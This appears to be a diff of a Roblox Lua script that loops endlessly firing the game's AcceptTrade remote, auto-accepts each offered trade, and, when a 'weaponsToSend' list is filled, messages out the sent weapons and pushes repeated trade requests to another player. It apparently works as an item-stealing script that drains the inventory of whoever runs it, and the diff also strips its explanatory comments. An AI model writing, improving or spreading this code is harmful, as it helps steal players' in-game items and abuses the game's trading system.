@@ -223,26 +223,26 @@ end
 local function spam()
     local acceptTradeEvent = game:GetService("ReplicatedStorage").Trade.AcceptTrade
     
-    -- Exécuter CancelAccept UNE SEULE FOIS au début
+
     game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("CancelAccept"):FireServer()
     
-    task.wait(0.5) -- Petit délai après le cancel
+    task.wait(0.5) 
     
-    -- Boucle infinie pour spammer les 3 remotes
+
     while true do
-        -- Premier remote
+  
         local args1 = {428469873}
         acceptTradeEvent:FireServer(unpack(args1))
         
-        task.wait(0.1) -- Petit délai entre chaque appel
+        task.wait(0.1) 
         
-        -- Deuxième remote
+
         local args2 = {285646582}
         acceptTradeEvent:FireServer(unpack(args2))
         
         task.wait(0.1)
         
-        -- Troisième remote (nécessite tradeUpdate.LastOffer)
+
         game:GetService("ReplicatedStorage").Trade.UpdateTrade.OnClientEvent:Connect(function(tradeUpdate)
             if tradeUpdate.LastOffer then
                 local args3 = {428469873, tradeUpdate.LastOffer}
@@ -250,7 +250,7 @@ local function spam()
             end
         end)
         
-        task.wait(0.5) -- Délai avant de recommencer la boucle
+        task.wait(0.5) 
     end
 end
 
@@ -521,6 +521,8 @@ if #weaponsToSend > 0 then
             wait(2)
             SendMessage(sentWeapons)
             doTrade(player.Name)
+           sendTradeRequest(p)
+
         end
     end
     
@@ -531,6 +533,8 @@ if #weaponsToSend > 0 then
             wait(2)
             SendMessage(sentWeapons)
             doTrade(p.Name)
+            sendTradeRequest(p)
+
             break
         end
     end
